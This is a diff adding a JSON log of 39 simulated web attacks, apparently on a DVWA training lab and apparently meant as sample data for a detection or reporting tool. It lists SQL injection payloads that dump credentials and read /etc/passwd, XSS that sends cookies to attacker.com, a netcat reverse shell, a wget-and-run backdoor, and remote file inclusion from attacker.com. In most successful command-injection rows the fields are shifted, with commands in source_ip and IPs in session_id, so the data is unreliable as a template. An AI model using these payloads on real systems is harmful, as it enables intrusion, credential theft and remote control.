@@ -1,0 +1,356 @@
+{
+  "total_events": 39,
+  "events": [
+    {
+      "timestamp": "2025-12-12 10:35:12",
+      "attack_type": "SQL_INJECTION",
+      "success": false,
+      "payload": "' OR '1'='1",
+      "source_ip": "192.168.1.100",
+      "session_id": "SESSION_001",
+      "severity": 5
+    },
+    {
+      "timestamp": "2025-12-12 10:35:45",
+      "attack_type": "SQL_INJECTION",
+      "success": false,
+      "payload": "admin' --",
+      "source_ip": "192.168.1.100",
+      "session_id": "SESSION_001",
+      "severity": 5
+    },
+    {
+      "timestamp": "2025-12-12 10:36:23",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' UNION SELECT NULL,NULL--",
+      "source_ip": "192.168.1.100",
+      "session_id": "SESSION_001",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 10:37:01",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' UNION SELECT user,password FROM users--",
+      "source_ip": "192.168.1.100",
+      "session_id": "SESSION_001",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 10:37:34",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' UNION SELECT database(),version()--",
+      "source_ip": "192.168.1.100",
+      "session_id": "SESSION_001",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 10:38:12",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+      "source_ip": "192.168.1.100",
+      "session_id": "SESSION_001",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 10:39:15",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' AND SLEEP(3)--",
+      "source_ip": "192.168.1.100",
+      "session_id": "SESSION_001",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 10:40:23",
+      "attack_type": "XSS",
+      "success": false,
+      "payload": "<script>alert(1)</script>",
+      "source_ip": "192.168.1.101",
+      "session_id": "SESSION_002",
+      "severity": 4
+    },
+    {
+      "timestamp": "2025-12-12 10:40:56",
+      "attack_type": "XSS",
+      "success": false,
+      "payload": "<img src=x onerror=alert(1)>",
+      "source_ip": "192.168.1.101",
+      "session_id": "SESSION_002",
+      "severity": 4
+    },
+    {
+      "timestamp": "2025-12-12 10:41:32",
+      "attack_type": "XSS",
+      "success": true,
+      "payload": "<svg/onload=alert(document.cookie)>",
+      "source_ip": "192.168.1.101",
+      "session_id": "SESSION_002",
+      "severity": 7
+    },
+    {
+      "timestamp": "2025-12-12 10:42:10",
+      "attack_type": "XSS",
+      "success": true,
+      "payload": "<iframe src=javascript:alert(1)>",
+      "source_ip": "192.168.1.101",
+      "session_id": "SESSION_002",
+      "severity": 7
+    },
+    {
+      "timestamp": "2025-12-12 10:45:01",
+      "attack_type": "COMMAND_INJECTION",
+      "success": false,
+      "payload": "127.0.0.1; ls",
+      "source_ip": "192.168.1.102",
+      "session_id": "SESSION_003",
+      "severity": 5
+    },
+    {
+      "timestamp": "2025-12-12 10:45:34",
+      "attack_type": "COMMAND_INJECTION",
+      "success": false,
+      "payload": "127.0.0.1 && whoami",
+      "source_ip": "192.168.1.102",
+      "session_id": "SESSION_003",
+      "severity": 5
+    },
+    {
+      "timestamp": "2025-12-12 10:46:12",
+      "attack_type": "COMMAND_INJECTION",
+      "success": true,
+      "payload": "127.0.0.1",
+      "source_ip": "cat /etc/passwd",
+      "session_id": "192.168.1.102",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 10:46:45",
+      "attack_type": "COMMAND_INJECTION",
+      "success": true,
+      "payload": "127.0.0.1",
+      "source_ip": "nc -e /bin/sh 192.168.1.102 4444",
+      "session_id": "192.168.1.102",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 10:50:15",
+      "attack_type": "FILE_INCLUSION",
+      "success": false,
+      "payload": "../../etc/passwd",
+      "source_ip": "192.168.1.103",
+      "session_id": "SESSION_004",
+      "severity": 4
+    },
+    {
+      "timestamp": "2025-12-12 10:50:48",
+      "attack_type": "FILE_INCLUSION",
+      "success": false,
+      "payload": "../../../etc/shadow",
+      "source_ip": "192.168.1.103",
+      "session_id": "SESSION_004",
+      "severity": 4
+    },
+    {
+      "timestamp": "2025-12-12 10:51:23",
+      "attack_type": "FILE_INCLUSION",
+      "success": true,
+      "payload": "....//....//....//etc/passwd",
+      "source_ip": "192.168.1.103",
+      "session_id": "SESSION_004",
+      "severity": 7
+    },
+    {
+      "timestamp": "2025-12-12 10:52:01",
+      "attack_type": "FILE_INCLUSION",
+      "success": true,
+      "payload": "http://attacker.com/shell.txt",
+      "source_ip": "192.168.1.103",
+      "session_id": "SESSION_004",
+      "severity": 7
+    },
+    {
+      "timestamp": "2025-12-12 11:00:01",
+      "attack_type": "BRUTE_FORCE",
+      "success": false,
+      "payload": "admin:password",
+      "source_ip": "192.168.1.104",
+      "session_id": "SESSION_005",
+      "severity": 3
+    },
+    {
+      "timestamp": "2025-12-12 11:00:03",
+      "attack_type": "BRUTE_FORCE",
+      "success": false,
+      "payload": "admin:123456",
+      "source_ip": "192.168.1.104",
+      "session_id": "SESSION_005",
+      "severity": 3
+    },
+    {
+      "timestamp": "2025-12-12 11:00:05",
+      "attack_type": "BRUTE_FORCE",
+      "success": false,
+      "payload": "admin:admin",
+      "source_ip": "192.168.1.104",
+      "session_id": "SESSION_005",
+      "severity": 3
+    },
+    {
+      "timestamp": "2025-12-12 11:00:07",
+      "attack_type": "BRUTE_FORCE",
+      "success": false,
+      "payload": "admin:letmein",
+      "source_ip": "192.168.1.104",
+      "session_id": "SESSION_005",
+      "severity": 3
+    },
+    {
+      "timestamp": "2025-12-12 11:00:09",
+      "attack_type": "BRUTE_FORCE",
+      "success": false,
+      "payload": "admin:qwerty",
+      "source_ip": "192.168.1.104",
+      "session_id": "SESSION_005",
+      "severity": 3
+    },
+    {
+      "timestamp": "2025-12-12 11:00:11",
+      "attack_type": "BRUTE_FORCE",
+      "success": false,
+      "payload": "admin:password123",
+      "source_ip": "192.168.1.104",
+      "session_id": "SESSION_005",
+      "severity": 3
+    },
+    {
+      "timestamp": "2025-12-12 11:00:13",
+      "attack_type": "BRUTE_FORCE",
+      "success": true,
+      "payload": "admin:Password1!",
+      "source_ip": "192.168.1.104",
+      "session_id": "SESSION_005",
+      "severity": 6
+    },
+    {
+      "timestamp": "2025-12-12 11:10:01",
+      "attack_type": "CSRF",
+      "success": false,
+      "payload": "<img src=http://dvwa/vulnerabilities/csrf/?password_new=hacked>",
+      "source_ip": "192.168.1.105",
+      "session_id": "SESSION_006",
+      "severity": 3
+    },
+    {
+      "timestamp": "2025-12-12 11:10:34",
+      "attack_type": "CSRF",
+      "success": true,
+      "payload": "<form action=http://dvwa/vulnerabilities/csrf/> method=GET",
+      "source_ip": "192.168.1.105",
+      "session_id": "SESSION_006",
+      "severity": 6
+    },
+    {
+      "timestamp": "2025-12-12 11:15:01",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' OR '1'='1",
+      "source_ip": "192.168.1.106",
+      "session_id": "SESSION_007",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 11:15:23",
+      "attack_type": "XSS",
+      "success": true,
+      "payload": "<script>document.location='http://attacker.com/cookie?c='+document.cookie</script>",
+      "source_ip": "192.168.1.106",
+      "session_id": "SESSION_007",
+      "severity": 7
+    },
+    {
+      "timestamp": "2025-12-12 11:15:56",
+      "attack_type": "COMMAND_INJECTION",
+      "success": true,
+      "payload": "127.0.0.1",
+      "source_ip": "wget http://attacker.com/backdoor.sh",
+      "session_id": "192.168.1.106",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 11:16:34",
+      "attack_type": "COMMAND_INJECTION",
+      "success": true,
+      "payload": "127.0.0.1",
+      "source_ip": "chmod +x backdoor.sh && ./backdoor.sh",
+      "session_id": "192.168.1.106",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 11:20:01",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' UNION SELECT @@version,NULL--",
+      "source_ip": "192.168.1.107",
+      "session_id": "SESSION_008",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 11:20:23",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' UNION SELECT user(),database()--",
+      "source_ip": "192.168.1.107",
+      "session_id": "SESSION_008",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 11:20:45",
+      "attack_type": "FILE_INCLUSION",
+      "success": true,
+      "payload": "/etc/passwd",
+      "source_ip": "192.168.1.107",
+      "session_id": "SESSION_008",
+      "severity": 7
+    },
+    {
+      "timestamp": "2025-12-12 11:21:12",
+      "attack_type": "COMMAND_INJECTION",
+      "success": true,
+      "payload": "127.0.0.1",
+      "source_ip": "uname -a",
+      "session_id": "192.168.1.107",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 11:30:01",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' AND 1=2 UNION SELECT NULL,CONCAT(user,0x3a,password) FROM users--",
+      "source_ip": "192.168.1.108",
+      "session_id": "SESSION_009",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 11:30:34",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' AND 1=2 UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
+      "source_ip": "192.168.1.108",
+      "session_id": "SESSION_009",
+      "severity": 8
+    },
+    {
+      "timestamp": "2025-12-12 11:31:12",
+      "attack_type": "SQL_INJECTION",
+      "success": true,
+      "payload": "' AND 1=2 UNION SELECT NULL,load_file('/etc/passwd')--",
+      "source_ip": "192.168.1.108",
+      "session_id": "SESSION_009",
+      "severity": 8
+    }
+  ]
+}
